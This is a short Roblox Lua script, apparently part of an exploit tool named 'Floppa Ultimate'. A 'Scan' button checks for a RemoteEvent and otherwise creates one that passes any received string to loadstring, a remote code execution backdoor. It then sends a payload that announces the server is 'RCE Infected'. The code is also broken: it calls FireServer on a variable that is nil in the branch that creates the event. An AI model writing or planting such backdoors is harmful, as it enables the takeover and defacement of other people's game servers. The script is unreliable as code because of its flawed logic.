RCEInjectButton.Font = Enum.Font.SourceSans
RCEInjectButton.Text = "Scan"
RCEInjectButton.TextColor3 = Color3.fromRGB(0, 0, 0)
RCEInjectButton.TextSize = 30.000
RCEInjectButton.MouseButton1Click:Connect(function()
		local RCEremote = game.ReplicatedStorage:FindFirstChild("RemoteEvent")
		if RCEremote then
			print("RCE Found")
		elseif not RCEremote then
			local server = Instance.new("RemoteEvent",game.ReplicatedStorage)
			server.OnServerEvent:connect(function(player,SS)
				loadstring(SS)()
			end)
		end
		RCEremote:FireServer([[
            local mes = Instance.new("Hint", game.workspace)
            mes.Text = "Server got RCE Infected by Floppa Ultimate"
            task.delay(4, function() mes:Destroy() end)
        ]])
end)

